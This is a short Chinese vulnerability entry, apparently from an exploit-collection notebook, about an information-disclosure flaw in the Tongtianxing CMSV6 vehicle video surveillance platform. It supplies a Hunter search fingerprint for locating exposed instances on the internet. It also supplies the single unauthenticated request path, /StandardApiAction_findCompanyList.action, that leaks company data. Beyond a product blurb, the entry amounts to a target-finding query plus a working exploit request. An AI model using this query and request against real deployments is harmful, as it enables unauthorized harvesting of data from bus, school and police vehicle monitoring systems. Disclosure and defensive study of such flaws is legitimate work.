# 通天星CMSV6车载视频监控平台 StandardApiAction_findCompanyList存在信息泄露漏洞

# 一、漏洞简介
通天星CMSV6车载视频监控平台是东莞市通天星软件科技有限公司研发的监控平台，通天星CMSV6产品覆盖车载录像机、单兵录像机、网络监控摄像机、行驶记录仪等产品的视频综合平台。通天星科技应用于公交车车载、校车车载、大巴车车载、物流车载、油品运输车载、警车车载等公共交通视频监控，还应用在家居看护、商铺远程监控、私家车的行驶分享仪上等。通天星CMSV6车载视频监控平台StandardApiAction_findCompanyList存在信息泄露漏洞

# 二、影响版本
+ 通天星CMSV6车载视频监控平台

# 三、资产测绘
+ hunter`web.body="./open/webApi.html"`
+ 特征

![1699407412929-42aaba13-ce63-4d08-95e9-ce71fcab3ab4.png](./img/GQkoOthvOMVbREfc/1699407412929-42aaba13-ce63-4d08-95e9-ce71fcab3ab4-215897.png)

# 四、漏洞复现
```plain
/StandardApiAction_findCompanyList.action
```

![1706970512382-ec095a83-9453-42a2-9e8c-8e93eb7525bf.png](./img/GQkoOthvOMVbREfc/1706970512382-ec095a83-9453-42a2-9e8c-8e93eb7525bf-011750.png)



> 更新: 2024-12-28 13:05:35  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gsl14di27m85usc0>